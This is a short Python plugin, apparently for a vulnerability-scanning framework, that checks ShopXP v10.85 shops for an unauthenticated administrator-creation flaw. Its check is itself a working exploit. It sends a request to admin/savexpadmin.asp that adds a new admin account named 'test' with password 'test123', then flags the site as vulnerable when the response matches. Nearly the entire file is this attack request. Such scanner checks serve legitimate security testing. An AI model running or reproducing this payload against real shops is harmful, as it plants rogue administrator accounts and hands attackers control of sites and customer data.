# -*- coding:utf-8 -*-
#__Service_ = shopxp
#___name___ = Shopxp-v10.85


def assign(service , arg):
    if service =="shopxp":
        return True,arg
    
def audit(arg):
    payload = "admin/savexpadmin.asp?action=add&admin2=test&password2=test123&Submit2=%CC%ED%BC%D3%B9%DC%C0%ED%D4%B1"
    url = arg + payload
    code, head, body, errcode, final_url = curl.curl2(url)
    if code == 200  and "history.go(-1)" in body:
        security_hole(url) 
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('shopxp' , 'http://www.example.com/')[1])
    audit(assign('shopxp' , 'http://www.example.com/')[1])